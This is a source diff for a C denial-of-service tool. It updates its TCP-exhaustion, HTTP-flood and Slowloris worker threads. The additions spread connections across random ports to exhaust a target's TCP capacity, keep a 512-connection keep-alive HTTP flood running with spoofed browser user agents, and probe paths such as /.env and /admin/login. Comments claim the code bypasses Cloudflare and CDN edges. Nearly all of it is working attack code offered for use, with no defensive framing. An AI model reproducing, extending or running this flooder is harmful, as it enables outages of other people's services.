@@ -204,14 +204,25 @@ static void *mega_tcp_worker(void *arg) {
         int us = should_throttle();
         if (us > 0) { usleep((unsigned)us); continue; }
 
-        /* Fill pool */
+        /* Fill pool — 25% target port, 75% random port for global TCP exhaustion */
         while (pool < MEGA_TCP_POOL && !is_attack_stop()) {
             int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
             if (s < 0) break;
             int fl = 1;
             setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
             setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &fl, sizeof(fl));
-            if (tcp_connect_wait(s, &ta, 500) < 0) { close(s); continue; }
+
+            uint16_t p = (rand() & 3) == 0
+                ? (uint16_t)mt->port_base
+                : (uint16_t)((rand() % 65535) + 1);
+            if (p == 0) p = 1;
+            ta.sin_port = htons(p);
+
+            if (tcp_connect_wait(s, &ta, 400) < 0) { close(s); continue; }
+
+            /* Send byte to trigger app-layer processing (SSH/httpd/etc hold resources) */
+            { char b = 0; send(s, &b, 1, MSG_NOSIGNAL); }
+
             socks[pool++] = s;
             pkt_sent(64);
         }
@@ -328,8 +339,8 @@ static void *tls_exhaust_worker(void *arg) {
     return NULL;
 }
 
-/* Ã¢â€â‚¬Ã¢â€â‚¬ HTTP Flood (fixed: poll-based connect, TLS, real requests) Ã¢â€â‚¬Ã¢â€â‚¬ */
-#define HTTP_POOL 256
+/* HTTP Flood — connection pool + keep-alive, bypasses CF proxy edge */
+#define HTTP_POOL 512
 static void *http_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
     int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
@@ -338,68 +349,110 @@ static void *http_worker(void *arg) {
 
     time_t start = time(NULL);
     unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
+    int *socks = calloc(HTTP_POOL, sizeof(int));
+    SSL **ssls = calloc(HTTP_POOL, sizeof(SSL *));
+    time_t *last_req = calloc(HTTP_POOL, sizeof(time_t));
+    if (!socks || !ssls || !last_req) { free(socks); free(ssls); free(last_req); return NULL; }
+
     SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
-    if (!ctx) return NULL;
+    if (!ctx) { free(socks); free(ssls); free(last_req); return NULL; }
     SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
 
     const char *uas[] = {
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
-        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
     };
-    const char *paths[] = {"/", "/search?q=", "/login", "/api/v1/", "/wp-admin/", "/.env", "/admin/"};
+    const char *paths[] = {"/", "/favicon.ico", "/robots.txt", "/sitemap.xml",
+        "/wp-login.php", "/api/v1/users", "/.env", "/admin/login",
+        "/search?q=", "/index.php", "/api/health", "/feed"};
+
+    struct sockaddr_in ta = mt->target;
+    int pool = 0;
 
     while (time(NULL) - start < mt->duration && !is_attack_stop()) {
         int us = should_throttle();
         if (us > 0) { usleep((unsigned)us); continue; }
-        for (int c = 0; c < 64 && !is_attack_stop(); c++) {
+
+        /* Fill pool */
+        while (pool < HTTP_POOL && !is_attack_stop()) {
             int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-            if (s < 0) continue;
+            if (s < 0) break;
             int fl = 1;
             setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
-            if (tcp_connect_wait(s, &mt->target, 2000) < 0) { close(s); continue; }
+            setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &fl, sizeof(fl));
+            if (tcp_connect_wait(s, &ta, 2000) < 0) { close(s); continue; }
 
             SSL *ssl = SSL_new(ctx);
-            int use_ssl = 0;
             if (ssl) {
                 SSL_set_fd(ssl, s);
                 SSL_set_tlsext_host_name(ssl, mt->host);
-                use_ssl = (SSL_connect(ssl) == 1);
-                if (!use_ssl) SSL_free(ssl);
+                if (SSL_connect(ssl) != 1) { SSL_free(ssl); ssl = NULL; }
             }
-
-            char req[4096];
-            const char *ua = uas[rand_r(&seed) % 3];
-            const char *path = paths[rand_r(&seed) % 7];
-            snprintf(req, sizeof(req),
-                     "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n"
-                     "Accept: text/html,application/xhtml+xml,*/*\r\n"
-                     "Accept-Language: en-US,en;q=0.9\r\n"
-                     "Connection: keep-alive\r\n\r\n",
-                     path, mt->host, ua);
-            if (use_ssl)
-                SSL_write(ssl, req, (int)strlen(req));
-            else
-                send(s, req, strlen(req), MSG_NOSIGNAL);
-
-            /* Read response quickly */
-            char rbuf[4096];
-            struct pollfd pfd = { .fd = s, .events = POLLIN };
-            if (poll(&pfd, 1, 2000) > 0) {
-                if (use_ssl) SSL_read(ssl, rbuf, sizeof(rbuf));
-                else recv(s, rbuf, sizeof(rbuf), 0);
-            }
-            pkt_sent((int)strlen(req) + 256);
-            if (use_ssl) SSL_free(ssl);
-            close(s);
+            socks[pool] = s;
+            ssls[pool] = ssl;
+            last_req[pool] = 0;
+            pool++;
         }
-        usleep(10000);
+
+        /* Send requests — 1 req/s per connection, keep-alive across requests */
+        time_t now = time(NULL);
+        for (int i = 0; i < pool && !is_attack_stop(); i++) {
+            if (now - last_req[i] < 1) continue;
+            char req[4096];
+            const char *ua = uas[rand_r(&seed) % 5];
+            const char *path = paths[rand_r(&seed) % 12];
+            snprintf(req, sizeof(req),
+                "GET %s HTTP/1.1\r\nHost: %s\r\n"
+                "User-Agent: %s\r\n"
+                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                "Accept-Language: en-US,en;q=0.5\r\n"
+                "Accept-Encoding: gzip, deflate, br\r\n"
+                "Cache-Control: no-cache\r\n"
+                "Connection: keep-alive\r\n\r\n",
+                path, mt->host, ua);
+            if (ssls[i])
+                SSL_write(ssls[i], req, (int)strlen(req));
+            else
+                send(socks[i], req, strlen(req), MSG_NOSIGNAL);
+            last_req[i] = now;
+            pkt_sent((int)strlen(req));
+        }
+
+        /* Reap dead connections */
+        struct pollfd pfds[HTTP_POOL];
+        for (int i = 0; i < pool; i++) {
+            pfds[i].fd = socks[i];
+            pfds[i].events = POLLERR | POLLHUP;
+        }
+        if (poll(pfds, (nfds_t)pool, 200) > 0) {
+            int w = 0;
+            for (int i = 0; i < pool; i++) {
+                if (pfds[i].revents & (POLLERR | POLLHUP)) {
+                    if (ssls[i]) SSL_free(ssls[i]);
+                    close(socks[i]);
+                } else {
+                    if (w != i) {
+                        socks[w] = socks[i];
+                        ssls[w] = ssls[i];
+                        last_req[w] = last_req[i];
+                    }
+                    w++;
+                }
+            }
+            pool = w;
+        }
+        sched_yield();
     }
+    for (int i = 0; i < pool; i++) { if (ssls[i]) SSL_free(ssls[i]); close(socks[i]); }
     SSL_CTX_free(ctx);
+    free(socks); free(ssls); free(last_req);
     return NULL;
 }
 
-/* Ã¢â€â‚¬Ã¢â€â‚¬ Slowloris (fixed: poll-based connect, CDN-bypass, variable drip) Ã¢â€â‚¬Ã¢â€â‚¬ */
+/* Slowloris (poll-based connect, CDN-bypass, variable drip) */
 #define SLOW_POOL 512
 static void *slowloris_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
